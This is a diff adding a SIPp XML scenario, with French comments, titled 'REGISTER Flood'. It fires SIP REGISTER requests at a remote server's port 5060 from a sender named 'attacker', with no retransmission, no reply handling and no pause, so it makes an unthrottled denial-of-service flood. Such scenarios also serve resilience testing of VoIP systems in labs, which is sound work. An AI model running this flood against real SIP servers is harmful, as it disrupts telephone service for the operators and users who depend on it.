@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<scenario name="REGISTER Flood">
+  <!-- Flood massif de REGISTER sur le port 5060 -->
+  <send retrans="0">
+    <![CDATA[
+    REGISTER sip:[remote_ip]:5060 SIP/2.0
+    Via: SIP/2.0/UDP [local_ip]:[local_port];branch=[branch]
+    From: <sip:attacker@[local_ip]>;tag=[call_number]
+    To: <sip:attacker@[local_ip]>
+    Call-ID: regflood-[call_number]@[local_ip]
+    CSeq: [cseq] REGISTER
+    Contact: <sip:attacker@[local_ip]:[local_port]>
+    Expires: 60
+    Content-Length: 0
+    ]]>
+  </send>
+  <!-- Pas de recv ni pause, boucle infinie -->
+  <nop/>
+</scenario>
